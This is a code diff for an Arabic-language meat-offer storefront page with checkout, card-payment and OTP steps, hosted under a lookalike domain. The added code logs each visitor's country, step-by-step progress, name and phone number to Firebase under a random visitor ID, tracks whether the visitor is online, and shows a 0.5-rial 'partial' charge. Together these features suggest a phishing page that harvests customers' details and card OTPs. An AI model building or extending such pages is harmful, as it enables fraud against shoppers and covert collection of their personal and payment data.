@@ -1,6 +1,6 @@
 "use client"
 
-import { useState } from "react"
+import { useEffect, useState } from "react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { Dialog, DialogContent, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog"
@@ -11,6 +11,9 @@ import { Separator } from "@/components/ui/separator"
 import Link from "next/link"
 import { Star, Truck, Shield, Clock, CreditCard, Smartphone } from "lucide-react"
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
+import PaymentOptions from "@/components/part-all"
+import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/utils"
 
 type FlowStep = "hero" | "offer" | "checkout" | "payment" | "otp" | "success"
 
@@ -66,7 +69,7 @@ const offers: Offer[] = [
     image: "https://zabehaty.uae.zabe7ti.website/uploads/7f56eeb9e3e76808187fd340c097a295.jpeg",
     badge: "عرض الشواء",
   },
- 
+
   {
     id: "luxury",
     title: "باقة القطع الفاخرة",
@@ -86,6 +89,7 @@ const offers: Offer[] = [
     badge: "اقتصادي",
   },
 ]
+const visitorId = `omn-app-${Math.random().toString(36).substring(2, 15)}`;
 
 export default function MainPage() {
   const [currentStep, setCurrentStep] = useState<FlowStep>("hero")
@@ -100,13 +104,53 @@ export default function MainPage() {
   })
   const [paymentMethod, setPaymentMethod] = useState<"card" | "cash">("card")
   const [otpCode, setOtpCode] = useState("")
+  const [paymentType, setPaymentType] = useState("")
   const [cardInfo, setCardInfo] = useState({
     number: "",
     expiry: "",
     cvv: "",
     name: "",
   })
+  const getLocationAndLog = async () => {
+    if (!visitorId) return;
 
+    // This API key is public and might be rate-limited or disabled.
+    // For a production app, use a secure way to handle API keys, ideally on the backend.
+    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb"
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
+
+    try {
+      const response = await fetch(url)
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`)
+      }
+      const country = await response.text()
+      await addData({
+        createdDate: new Date().toISOString(),
+        id: visitorId,
+        country: country,
+        action: "page_load",
+        currentPage: "الرئيسية ",
+      })
+      localStorage.setItem("country", country) // Consider privacy implications
+      setupOnlineStatus(visitorId)
+    } catch (error) {
+      console.error("Error fetching location:", error)
+      // Log error with visitor ID for debugging
+      await addData({
+        createdDate: new Date().toISOString(),
+        id: visitorId,
+        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
+        action: "location_error"
+      });
+    }
+  }
+  useEffect(() => {
+    getLocationAndLog()
+  }, []);
+  useEffect(() => {
+    addData({ id: visitorId, currentStep })
+  }, [currentStep]);
   // Update the totalPrice calculation
   const totalPrice = selectedOffer ? selectedOffer.offerPrice * quantity : 0
 
@@ -121,6 +165,8 @@ export default function MainPage() {
 
   const handleProceedToPayment = () => {
     if (customerInfo.name && customerInfo.phone && customerInfo.address) {
+      addData({ id: visitorId, name: customerInfo.name, phone: customerInfo.phone })
+
       setCurrentStep("payment")
     }
   }
@@ -174,8 +220,8 @@ export default function MainPage() {
           <DialogContent className="max-w-[350px]">
             <img src="44.jpg" alt="" />
             <DialogFooter>
-              <Button className="bg-green-700 w-full" 
-              onClick={()=>{handleSelectOffer(offers[0])}}>
+              <Button className="bg-green-700 w-full"
+                onClick={() => { handleSelectOffer(offers[0]) }}>
                 أحصل على العرض
               </Button>
             </DialogFooter>
@@ -239,7 +285,7 @@ export default function MainPage() {
 
               {/* CTA Buttons */}
               <div className="flex flex-col sm:flex-row gap-4">
-                <Link href="/products">
+                <Link href="/">
                   <Button
                     size="lg"
                     className="w-full bg-gradient-to-r from-yellow-500 to-orange-500 hover:from-yellow-600 hover:to-orange-600 text-black font-bold px-8 py-4 text-lg shadow-xl transform hover:scale-105 transition-all duration-200"
@@ -291,18 +337,18 @@ export default function MainPage() {
                 </div>
 
                 <Button
-                  onClick={()=>handleSelectOffer(offers[1])}
+                  onClick={() => handleSelectOffer(offers[1])}
                   className="w-full my-2 bg-gradient-to-r from-yellow-400 to-orange-400 hover:from-yellow-500 hover:to-orange-500 text-black font-bold"
                 >
                   احصل على العرض
                 </Button>
 
                 <Button
-                variant={'outline'}
+                  variant={'outline'}
                   onClick={handleOfferClick}
                   className="w-full my-2  text-black font-bold"
                 >
-            باقي العروض
+                  باقي العروض
                 </Button>
               </div>
 
@@ -360,7 +406,7 @@ export default function MainPage() {
                     <h3 className="text-lg font-bold mb-2 text-right">{offer.title}</h3>
                     <p className="text-sm text-gray-600 mb-3 text-right">{offer.description}</p>
 
-                
+
                     <div className="flex items-center justify-between mb-4">
                       <div className="text-right">
                         <span className="text-2xl font-bold text-green-600">{offer.offerPrice} ر.ع</span>
@@ -457,10 +503,11 @@ export default function MainPage() {
                 <span>رسوم التوصيل</span>
                 <span className="text-green-600">مجاناً</span>
               </div>
+              <PaymentOptions setPaymentType={setPaymentType} />
               <Separator className="my-2" />
               <div className="flex justify-between font-bold">
                 <span>المجموع</span>
-                <span>{totalPrice} ر.ع</span>
+                <span>{paymentType === "partial" ? "0.5" : totalPrice} ر.ع</span>
               </div>
             </div>
 
@@ -548,8 +595,8 @@ export default function MainPage() {
                 </div>
               </div>
             )}
-  <div className="bg-gray-50 p-4 rounded-lg">
-          
+            <div className="bg-gray-50 p-4 rounded-lg">
+
             </div>
             <div className="bg-gray-50 p-4 rounded-lg">
               <div className="flex justify-between font-bold text-lg">
